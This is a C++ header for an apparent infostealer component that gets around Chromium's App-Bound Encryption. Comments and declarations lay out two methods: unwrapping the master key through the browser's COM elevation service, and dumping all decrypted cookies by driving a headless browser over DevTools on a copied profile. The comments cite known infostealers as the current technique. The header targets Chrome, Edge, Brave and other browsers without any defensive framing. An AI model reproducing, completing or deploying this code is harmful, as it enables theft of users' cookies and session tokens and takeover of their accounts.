#pragma once
// Chromium App-Bound Encryption (ABE / "v20") helpers.
//
// Local State carries os_crypt.app_bound_encrypted_key = "APPB" + base64 of a
// double-DPAPI blob (inner: user scope, outer: SYSTEM scope). The plaintext
// 32-byte key can be obtained two independent ways:
//
//   1. via_elevator(): call the browser's elevation service over COM
//      (IElevator / IElevator2 / IEdgeElevatorFinal). The service unwraps both
//      DPAPI layers, but enforces a path validation: the caller's executable
//      must normalize to the same install path the encrypting process had.
//      Calling it is cheap; it succeeds only in favourable contexts, and the
//      wrapped blob is always kept for offline unwrapping.
//
//   2. cookies_via_devtools(): launch the installed browser headless against
//      a private copy of the profile and ask it (DevTools protocol over
//      WebSocket) for Network.getAllCookies. The browser decrypts its own
//      cookies - ABE, v10/v11, everything - no key needed, no admin, no
//      injection. State of the art 2025/2026 technique (Sryxen, Misery).
//
// Everything here is best-effort and never throws.
#include <cstdint>
#include <string>
#include <vector>

namespace abe {

// Unwrap an "APPB" blob (without the 4-byte literal prefix) via the elevation
// service of the browser family (case-insensitive name match: "chrome",
// "chrome beta", "brave", "edge", "avast"). Returns 32-byte key or empty.
std::vector<uint8_t> via_elevator(const std::vector<uint8_t>& appb_blob,
                                  const std::string& browser_name);

// Locate the browser executable ("" when not found). Matching is on the
// family name, e.g. "Chrome", "Chrome Beta", "Edge", "Brave", "Vivaldi".
std::string find_browser_exe(const std::string& browser_name);

// Headless-DevTools cookie extraction against a private copy of the profile.
// Returns "host\tname\tvalue\tpath\r\n" lines (all cookies, decrypted by the
// browser itself) or "" on failure.
std::string cookies_via_devtools(const std::string& browser_name,
                                 const std::string& browser_exe,
                                 const std::string& user_data_dir);

} // namespace abe
